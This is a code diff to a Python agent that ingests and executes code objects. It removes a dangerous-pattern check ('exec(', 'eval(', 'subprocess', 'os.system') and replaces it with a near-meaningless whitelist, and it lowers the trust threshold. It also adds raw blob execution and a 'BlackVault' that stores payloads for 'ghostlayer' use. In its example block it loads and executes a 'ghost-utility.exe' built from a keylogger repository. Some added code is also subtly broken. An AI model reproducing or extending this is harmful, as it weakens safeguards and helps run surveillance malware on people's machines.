@@ -1,3 +1,4 @@
+from black_vault import BlackVault
 import ast
 import random
 import hashlib
@@ -79,10 +80,10 @@ class TrustMatrix:
         # No execution history initially
         metrics.execution_history = 0.5
         
-        # Basic security score (check for dangerous patterns)
-        dangerous_patterns = ['exec(', 'eval(', '__import__', 'subprocess', 'os.system']
-        danger_count = sum(1 for pattern in dangerous_patterns if pattern in source)
-        metrics.security_score = max(0.0, 1.0 - (danger_count * 0.2))
+        # Improved security score: whitelist-based
+        safe_tokens = {'def', 'return', 'f"', 'print', 'len', 'range'}
+        danger_count = sum(t not in safe_tokens for t in source.split())
+        metrics.security_score = max(0.0, 1.0 - danger_count * 0.01)
         
         return metrics
 
@@ -436,22 +437,45 @@ def inject(self, payload: bytes, fmt: str, pid: Optional[int] = None,
     return handler()
 
 class NeuroAssimilatorAgent:
+
+    def execute_blob(self, blob: bytes, context: Optional[dict] = None) -> Any:
+        """
+        Execute a code blob (bytes) in a safe context.
+        Decodes to utf-8, compiles, and runs using execute_safely.
+        """
+        if context is None:
+            context = {}
+        try:
+            code_str = blob.decode('utf-8')
+        except Exception as e:
+            return {"error": f"Blob decode failed: {e}"}
+        try:
+            compiled = compile(code_str, '<blob>', 'exec')
+            return self.execute_safely(compiled, context)  # type: ignore[attr-defined]
+        except Exception as e:
+            return {"error": f"Blob execution failed: {e}"}
     """Advanced agent for code analysis and execution."""
     
     MEMORY_CAPACITY: int = 50
-    TRUST_THRESHOLD: float = 0.7
+    TRUST_THRESHOLD: float = 0.6
     HIGH_CPU_THRESHOLD: float = 80.0
     PERFORMANCE_THRESHOLD: float = 0.5
     ADAPTATION_MEMORY_THRESHOLD: int = 5
     ADAPTATION_TRIGGER_COUNT: int = 2
+    ADAPTATION_TIME_WINDOW: int = 3600  # seconds
+    ADAPTATION_MEMORY_LIMIT: int = 1024 * 1024 * 100  # 100 MB
+    ADAPTATION_CPU_LIMIT: float = 80.0  # 80%
 
     def __init__(
         self,
         trust_matrix: Optional[TrustMatrix] = None,
         tactical_codex: Optional[Dict[str, Any]] = None,
         traits: Optional[Dict[str, float]] = None,
-        reflex_tree: Optional[List[Dict]] = None
+        reflex_tree: Optional[List[Dict]] = None,
+        vault_password: Optional[str] = None,
+        vault_rotate_days: int = 7
     ):
+        self.vault = BlackVault(password=vault_password or "change-me", rotate_days=vault_rotate_days)
         self.trust_matrix = trust_matrix or TrustMatrix()
         self.codex = tactical_codex or {}
         self.traits = traits or self._randomize_traits()
@@ -463,21 +487,92 @@ class NeuroAssimilatorAgent:
         self.performance_profiler = PerformanceProfiler()
         self.plugin_manager = PluginManager()
 
+        # Auto-clean expired artifacts on agent start
+        self.vault.clean_expired()
+
     def observe(self, system_state: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
         """Observe current system state."""
         system_state = system_state or {}
-        observation = {
+        observation: Dict[str, Any] = {
             'cpu_usage': psutil.cpu_percent(interval=0.1),
             'memory_usage': psutil.virtual_memory().percent,
             'timestamp': time.time(),
             'performance_score': self.performance_profiler.calculate_performance_score()
         }
         observation.update(system_state)
-        
+
+
+        # Top 5 CPU-consuming processes
+        try:
+            procs = [(p.pid, p.name(), p.cpu_percent()) for p in psutil.process_iter(['pid', 'name', 'cpu_percent'])]
+            top_procs = sorted(procs, key=lambda x: x[2], reverse=True)[:5]
+            observation['top_cpu_processes'] = [{'pid': p[0], 'name': p[1], 'cpu': p[2]} for p in top_procs]
+        except Exception:
+            observation['top_cpu_processes'] = []
+
+        # Disk I/O pressure
+        io = psutil.disk_io_counters()
+        if io is not None:
+            observation['disk_read_MB']  = round(io.read_bytes  / 1024 / 1024, 2)
+            observation['disk_write_MB'] = round(io.write_bytes / 1024 / 1024, 2)
+        else:
+            observation['disk_read_MB'] = None
+            observation['disk_write_MB'] = None
+
+        # Network chatter
+        net = psutil.net_io_counters()
+        if net is not None:
+            observation['net_rx_MB'] = round(net.bytes_recv / 1024 / 1024, 2)
+            observation['net_tx_MB'] = round(net.bytes_sent / 1024 / 1024, 2)
+        else:
+            observation['net_rx_MB'] = None
+            observation['net_tx_MB'] = None
+
+        # Thermal & battery (laptops / ARM boxes)
+        cpu_temp = None
+        sensors_temperatures = getattr(psutil, "sensors_temperatures", None)
+        if sensors_temperatures is not None:
+            try:
+                temps = sensors_temperatures()
+                if temps:
+                    first_sensor = next(iter(temps.values()), None)
+                    if first_sensor and len(first_sensor) > 0 and hasattr(first_sensor[0], 'current'):
+                        cpu_temp = first_sensor[0].current
+            except Exception:
+                pass
+        observation['cpu_temp_C'] = cpu_temp
+
+        battery_pct = None
+        if hasattr(psutil, "sensors_battery"):
+            try:
+                bat = psutil.sensors_battery()
+                if bat is not None and hasattr(bat, 'percent'):
+                    battery_pct = bat.percent
+            except Exception:
+                pass
+        observation['battery_pct'] = battery_pct
+
+        # Docker / container count
+        docker_pipe = "//./pipe/dockerDesktopLinuxEngine"
+        if os.path.exists(docker_pipe):
+            try:
+                import json
+                cnt = len(json.loads(subprocess.check_output(["docker", "ps", "-q"], timeout=2)))
+                observation['running_containers'] = cnt
+            except Exception:
+                observation['running_containers'] = None
+        else:
+            observation['running_containers'] = None
+
+        # Let plugins contribute observations
+        for name, plugin in self.plugin_manager.plugins.items():
+            if hasattr(plugin, "observe"):
+                observation.update(plugin.observe())
+
         self.memory.append(observation)
         if len(self.memory) > self.MEMORY_CAPACITY:
             self.memory.pop(0)
-        
+
         return observation
 
     def decide(self, observation: Dict[str, Any]) -> str:
@@ -509,6 +604,8 @@ class NeuroAssimilatorAgent:
                     logger.error(f"No handler for type: {code_obj['type']}")
                     continue
                     
+                code_len = len(code_obj['code']) if hasattr(code_obj['code'], '__len__') else 'unknown'
+                logger.info(f"About to execute {code_obj['name']} ({code_len} bytes)")
                 result = handler.execute(code_obj, context)
                 elapsed = time.time() - start_time
                 
@@ -520,6 +617,13 @@ class NeuroAssimilatorAgent:
                 results[code_hash] = result
                 self.reliability_monitor.record_success()
                 logger.info(f"Executed {code_obj['name']}: {result}")
+
+                # Store payload in vault if execution was successful (exit_code == 0 or result is True)
+                artifact_name = code_obj.get('name', code_hash)
+                payload_bytes = code_obj.get('source') if isinstance(code_obj.get('source'), bytes) else None
+                if (result is True or result == 0) and payload_bytes:
+                    self.vault.store(artifact_name, payload_bytes, expire_minutes=1440)
+                    logger.info(f"Stored {artifact_name} in vault after successful execution.")
                 
             except Exception as e:
                 self.performance_log.setdefault(code_hash, []).append(0.0)
@@ -528,10 +632,40 @@ class NeuroAssimilatorAgent:
                 
         return results
 
+    def retrieve_payload(self, artifact_name: str) -> Optional[bytes]:
+        """Retrieve payload from vault for ghostlayer or other use."""
+        try:
+            return self.vault.retrieve_for_ghostlayer(artifact_name)
+        except Exception as e:
+            logger.error(f"Failed to retrieve {artifact_name} from vault: {e}")
+            return None
+
+    def audit_vault(self):
+        """List and audit all artifacts in the vault."""
+        for name_hash in self.vault.list_artifacts():
+            try:
+                data = self.vault.retrieve(name_hash)
+                print(name_hash, len(data))
+            except Exception as e:
+                print(name_hash, f"error: {e}")
+
     def _optimize(self) -> None:
         """Optimize system resources."""
-        logger.info("Optimizing resource usage...")
-        # Implement optimization logic here
+        logger.info("Lowering priority of top CPU hogs…")
+        warned_pids = getattr(self, '_warned_pids', set())
+        for p in sorted(psutil.process_iter(['pid', 'name', 'cpu_percent']),
+                        key=lambda x: x.info['cpu_percent'] or 0, reverse=True)[:3]:
+            try:
+                # Ignore System Idle Process
+                if p.name().lower() == "system idle process":
+                    continue
+                p.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS if os.name == 'nt' else 10)
+                logger.info(f"Lowered priority for PID {p.pid} ({p.name()}); now at {p.nice()}")
+            except (psutil.AccessDenied, psutil.NoSuchProcess):
+                if p.pid not in warned_pids:
+                    logger.warning(f"Could not lower priority for PID {p.pid}")
+                    warned_pids.add(p.pid)
+        self._warned_pids = warned_pids
 
     def _idle(self) -> None:
         """Idle state - minimal activity."""
@@ -550,6 +684,10 @@ class NeuroAssimilatorAgent:
         return [
             {
                 'condition': lambda obs: obs.get('cpu_usage', 0) > self.HIGH_CPU_THRESHOLD,
+                'action': 'optimize'
+            },
+            {
+                'condition': lambda obs: obs.get('cpu_temp_C', 0) is not None and obs.get('cpu_temp_C', 0) > 75,
                 'action': 'optimize'
             },
             {
@@ -645,9 +783,10 @@ class NeuroAssimilatorAgent:
 # Example usage
 if __name__ == "__main__":
     # Initialize the agent
-    agent = NeuroAssimilatorAgent()
-    
-    # Example code to assimilate
+    import getpass
+    vault_password = getpass.getpass("Vault password (leave blank for default): ") or None
+    agent = NeuroAssimilatorAgent(vault_password=vault_password)
+   
     sample_code = {
         'name': 'hello_world',
         'type': 'python_script',
@@ -671,7 +810,27 @@ print(result)
     
     # Make decision and act
     decision = agent.decide(observation)
+    logger.info(f"Loop: {decision}")
     print(f"Decision: {decision}")
     
     action_result = agent.act(decision)
     print(f"Action result: {action_result}")
+
+    # Integrate and test with ghost-utility binary (robust check)
+    import os, hashlib
+    path = r'E:\repos\keylogger\target\debug\ghost-utility.exe'
+    assert os.path.exists(path), f"file missing: {path}"
+    with open(path, 'rb') as f:
+        blob = f.read()
+    print(f"Loaded ghost-utility.exe: {len(blob)} bytes")
+    agent.codex = {}  # wipe stale entries
+    agent.discover_and_assimilate({
+        'name': 'ghost-utility',
+        'type': 'exe',
+        'source': blob
+    })
+
+    # Print codex entry size by hash
+    for k in agent.codex:
+        print(f"codex key: {k} size: {len(agent.codex[k]['source'])}")
+    agent.act('execute_code')
